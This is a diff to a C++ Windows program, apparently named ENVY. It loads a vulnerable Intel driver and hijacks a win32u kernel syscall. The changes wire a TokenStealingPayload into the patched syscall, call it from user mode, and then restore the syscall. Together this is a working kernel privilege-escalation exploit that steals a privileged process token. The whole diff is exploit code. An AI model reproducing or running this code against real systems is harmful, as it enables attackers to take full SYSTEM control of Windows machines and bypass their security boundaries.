@@ -10,10 +10,13 @@
 #include "kernel_module.h"
 #include <filesystem>
 
+extern "C" DWORD64 TokenStealingPayload();
+
 using namespace kernel;
 
 int main(int argc, char** args)
 {
+	LoadLibraryA("user32.dll");
 	std::cout << "[+] Welcome to ENVY..." << std::endl;
 	std::cout << "[+] Loading vulnerable driver..." << std::endl;
 	std::unique_ptr<kernel::vulnerable_driver> driver_resource = std::unique_ptr<kernel::vulnerable_driver>(new intel::intel_vulnerable_driver());
@@ -39,23 +42,18 @@ int main(int argc, char** args)
 	if (allocate_pool_kernel_addr == 0)
 		allocate_pool_kernel_addr = ntoskrnl->get_module_export(driver_resource.get(), "ExAllocatePool");
 
-	std::cout << "Kernel ExAllocatePool" << std::hex << allocate_pool_kernel_addr << std::dec << std::endl;
-
-	uint64_t pool_addr = 0;
-
-	std::cout << "BREAK!" << std::endl;
-	
-	win32u->patch_syscall(driver_resource.get(), allocate_pool_kernel_addr);
+	//uint64_t pool_addr = driver_resource->allocate_kernel_pool(POOL_TYPE::NonPagedPoolExecute, 0x1000);
+	win32u->patch_syscall(driver_resource.get(), (uint64_t)TokenStealingPayload);
 	{
-		using fnExAllocatePool = PVOID(WINAPI*)(POOL_TYPE, SIZE_T);
+		using fnStealTokenFn = void(WINAPI*)(void);
 		static const auto usermode_addr = reinterpret_cast<void*>(GetProcAddress(LoadLibrary("win32u.dll"), "NtGdiGetCOPPCompatibleOPMInformation"));
-		fnExAllocatePool ExAllocatePool = reinterpret_cast<fnExAllocatePool>(usermode_addr);
-		DebugBreak();
-		pool_addr = (uint64_t)ExAllocatePool(POOL_TYPE::NonPagedPoolExecute, 0xC);
+		fnStealTokenFn StealToken = reinterpret_cast<fnStealTokenFn>(usermode_addr);
+		StealToken();
 	}
-	//win32u->restore_syscall(driver_resource.get());
+	win32u->restore_syscall(driver_resource.get());
+	
 
-	std::cout << "0x" << std::hex << pool_addr << std::dec << std::endl;
+	//std::cout << "0x" << std::hex << pool_addr << std::dec << std::endl;
 	//win32u->patch_syscall(driver_resource.get(), shellcode_buffer);
 	//win32u->execute_and_restore_syscall<void>(driver_resource.get(), nullptr);
 
